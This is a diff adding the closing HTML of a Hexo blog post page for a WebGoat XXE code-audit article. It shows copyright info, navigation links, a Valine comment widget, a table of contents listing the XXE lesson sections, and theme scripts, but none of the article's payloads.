+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/Diff.png" class="">
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">WebGoat代码审计-05-XXE注入</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-04-18 16:22:04</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/04/18/WebGoat代码审计-05-XXE注入/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">从0到1完全掌握XXE</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PortSwigger-不安全的反序列化</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WebGoat-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5"><span class="nav-text">WebGoat 代码审计-05-XXE注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%9D%B6%E5%9C%BA"><span class="nav-text">0x02 靶场</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%8F%90%E4%B8%80%E5%98%B4%E7%9A%84-PageLesson3"><span class="nav-text">1. 提一嘴的 PageLesson3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-XXE-PageLesson4-%E5%88%A9%E7%94%A8-file-%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%87%BA%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="nav-text">2. XXE PageLesson4 利用 file 协议读出敏感数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86"><span class="nav-text">题目部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E9%83%A8%E5%88%86"><span class="nav-text">源码部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E8%A6%81%E8%AE%B2%E7%9A%84%E6%98%AF%E4%BA%A7%E7%94%9F-XXE-%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9D%97%E5%8E%9F%E5%9B%A0"><span class="nav-text">接下来要讲的是产生 XXE 的代码块原因</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%89%8B%E6%AE%B5"><span class="nav-text">修复手段</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-XXE-PageLesson7-%E6%94%B9%E5%8F%98Content-Type%E5%88%A9%E7%94%A8-file-%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%87%BA%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="nav-text">3. XXE PageLesson7 改变Content-Type利用 file 协议读出敏感数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86-1"><span class="nav-text">题目部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E9%83%A8%E5%88%86-1"><span class="nav-text">源码部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E9%83%A8%E5%88%86"><span class="nav-text">修复部分</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-XXE-PageLesson10-%E7%9B%B2%E6%B3%A8"><span class="nav-text">4. XXE PageLesson10 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86-2"><span class="nav-text">题目部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E9%83%A8%E5%88%86-2"><span class="nav-text">源码部分</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
